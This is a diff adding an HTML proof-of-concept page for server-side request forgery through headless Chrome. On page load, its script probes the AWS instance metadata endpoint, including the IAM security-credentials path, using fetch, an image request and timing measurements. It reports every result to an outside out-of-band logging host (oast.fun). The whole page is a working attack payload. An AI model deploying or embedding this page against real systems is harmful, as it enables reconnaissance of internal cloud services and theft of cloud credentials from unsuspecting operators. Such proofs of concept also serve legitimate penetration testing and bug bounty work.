@@ -1,0 +1,49 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>SSRF+JS PoC</title>
+</head>
+<body>
+  <h1>SSRF + Headless Chrome Metadata Access Test</h1>
+  <p>This page will attempt to access AWS instance metadata via JavaScript.</p>
+
+<script>
+// Attempt to fetch metadata using JavaScript
+(async () => {
+  try {
+    const res = await fetch('http://169.254.169.254/latest/meta-data/iam/security-credentials/', {
+      method: 'GET',
+      mode: 'no-cors',
+      cache: 'no-store'
+    });
+
+    // This will usually be opaque due to CORS, but still may trigger internal request
+    fetch('https://qdvmcotjxcymyhmzaoprhaixp8cti506f.oast.fun/log?status=fetch-attempted');
+  } catch (e) {
+    fetch('https://qdvmcotjxcymyhmzaoprhaixp8cti506f.oast.fun/log?error=' + encodeURIComponent(e.toString()));
+  }
+})();
+
+// Blind probing with <img>
+let img = new Image();
+img.src = 'http://169.254.169.254/latest/meta-data/';
+img.onload = () => {
+  fetch('https://qdvmcotjxcymyhmzaoprhaixp8cti506f.oast.fun/log?img=success');
+};
+img.onerror = () => {
+  fetch('https://qdvmcotjxcymyhmzaoprhaixp8cti506f.oast.fun/log?img=error');
+};
+
+// Timing-based detection
+const t0 = performance.now();
+fetch('http://169.254.169.254/latest/meta-data/')
+  .finally(() => {
+    const t1 = performance.now();
+    const duration = t1 - t0;
+    fetch('https://qdvmcotjxcymyhmzaoprhaixp8cti506f.oast.fun/log?timing=' + duration);
+  });
+</script>
+
+</body>
+</html>
